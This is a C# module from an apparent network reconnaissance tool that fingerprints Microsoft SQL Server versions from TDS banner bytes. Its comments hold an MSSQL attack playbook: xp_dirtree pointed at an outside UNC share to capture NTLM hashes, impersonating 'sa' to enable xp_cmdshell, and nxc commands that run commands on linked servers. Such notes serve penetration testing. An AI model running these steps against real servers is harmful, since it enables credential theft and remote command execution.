using System;
using System.Collections.Generic;
using System.Net.Http;

namespace Reecon
{
    class Mssql // Microsoft SQL Server
    {
        public static (string PortName, string PortData) GetInfo(string target, int port, List<byte> bannerBytes)
        {
            string version = ExtractMssqlVersion(bannerBytes) ?? "Unknown";
            int versionOffset = 8 + ((bannerBytes[9] << 8) | bannerBytes[10]);

            int major = bannerBytes[versionOffset];
            int minor = bannerBytes[versionOffset + 1];
            int build = (bannerBytes[versionOffset + 2] << 8) | bannerBytes[versionOffset + 3];

            string versionName = major switch
            {
                16 => "Microsoft SQL Server 2022",
                15 => "Microsoft SQL Server 2019",
                14 => "Microsoft SQL Server 2017",
                13 => "Microsoft SQL Server 2016",
                12 => "Microsoft SQL Server 2014",
                11 => "Microsoft SQL Server 2012",
                10 => "Microsoft SQL Server 2008",
                _  => "Microsoft SQL Server (Unknown)"
            };
            
            string PortName = versionName;
            string PortData = $"- Version: {version}";
            return (PortName, PortData);
        }
        
        public static (string PortName, string PortData) GetInfo(string target, int port)
        {
            // TODO: Implement MSSQL handshake for server version
            // TODO: Implement MSSQL NTLM handshake for server version

            // TODO: Implement basic auth'd enumeration (VERSION, DB's, Tables, user privs)
            /*
             
            // What can your user do?
            select dp.NAME AS principal_name,
            dp.type_desc AS principal_type_desc,
            o.NAME AS object_name,
            p.permission_name,
            p.state_desc AS permission_state_desc
            from   sys.database_permissions p
            left   OUTER JOIN sys.all_objects o
            on     p.major_id = o.OBJECT_ID
            inner  JOIN sys.database_principals dp
            on     p.grantee_principal_id = dp.principal_id
            WHERE o.NAME LIKE 'xp_%' OR o.NAME LIKE 'dm_os_file%';

            1 Line
            select dp.NAME AS principal_name, dp.type_desc AS principal_type_desc, o.NAME AS object_name, p.permission_name, p.state_desc AS permission_state_desc from sys.database_permissions p left   OUTER JOIN sys.all_objects o on p.major_id = o.OBJECT_ID inner JOIN sys.database_principals dp on p.grantee_principal_id = dp.principal_id WHERE o.NAME LIKE 'xp_%' OR o.NAME LIKE 'dm_os_file%';
            */

            // EXEC xp_dirtree 'C:\', 1, 1
            // If `public` has `xp_dirtree`, then you can capture the hash
            // If `public` has `dm_os_file_exists`, then you can check what files exist
            // exec master.dbo.xp_dirtree '\\10.10.16.37\test'

            // Test users you can impersonate
            /*
            SELECT distinct b.name
            FROM sys.server_permissions a
            INNER JOIN sys.server_principals b
            ON a.grantor_principal_id = b.principal_id
            WHERE a.permission_name = 'IMPERSONATE'
            
            SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

            // If you can impersonate "sa"
            EXECUTE AS LOGIN = 'sa';
            EXEC master..sp_configure 'show advanced options', '1'
            RECONFIGURE
            EXEC master..sp_configure 'xp_cmdshell', '1'
            RECONFIGURE
            EXEC master..xp_cmdshell 'whoami' // Rerun at end
            
            
            // Enumerate linked servers
            nxc mssql <ip> -u user -p password -M enum_links
            
            // Exec command on a linked server
            nxc mssql <ip> -u user -p password -M exec_on_link -o LINKED_SERVER=BRAAVOS COMMAND='select @@servername'
            
            // If you get a timeout, check
            nxc mssql <ip> -u user -p password -q 'EXEC sp_helplinkedsrvlogin;'
            
            // If there are no results - See if you can manually add a DNS record for the linked server, and re-run it
            
            */
            string toReturn = "- Bug Reelix to finish MSSQL implementation.";
            return ("MSSQL", toReturn);
        }
        
        public static string? ExtractMssqlVersion(List<byte> bannerBytes)
        {
            // Minimum check: 8-byte TDS header + at least 5 bytes for first token
            if (bannerBytes == null || bannerBytes.Count < 13)
                return null;

            // Must be TDS Tabular/Response (0x04) and EOM (0x01)
            if (bannerBytes[0] != 0x04 || bannerBytes[1] != 0x01)
                return null;

            int packetLength = (bannerBytes[2] << 8) | bannerBytes[3];
            if (packetLength != bannerBytes.Count)
                return null;

            // Token 0 must be VERSION (0x00)
            if (bannerBytes[8] != 0x00)
                return null;

            // Read the payload offset for the VERSION token (bytes 9-10, big-endian)
            // Offset is calculated from the start of the payload (byte 8)
            int versionOffset = 8 + ((bannerBytes[9] << 8) | bannerBytes[10]);

            // Ensure we have all 6 version bytes in the buffer
            if (versionOffset + 6 > bannerBytes.Count)
                return null;

            byte major    = bannerBytes[versionOffset];
            byte minor    = bannerBytes[versionOffset + 1];
            int  build    = (bannerBytes[versionOffset + 2] << 8) | bannerBytes[versionOffset + 3];
            int  subBuild = (bannerBytes[versionOffset + 4] << 8) | bannerBytes[versionOffset + 5];

            return $"{major}.{minor}.{build}.{subBuild}";
        }

        // MSSQL - Sample: 04 01 00 25 00 00 01 00 00 00 15 00 06 01 00 1b
        public static bool CheckBanner(List<byte> bannerBytes)
        {
            // Console.WriteLine(string.Join(',', headerBytes));
            if (bannerBytes[0] == 0x04 && bannerBytes[1] == 0x01 && bannerBytes[2] == 0x00 && bannerBytes[3] == 0x25)
            {
                return true;
            }
            return false;
        }
    }
}
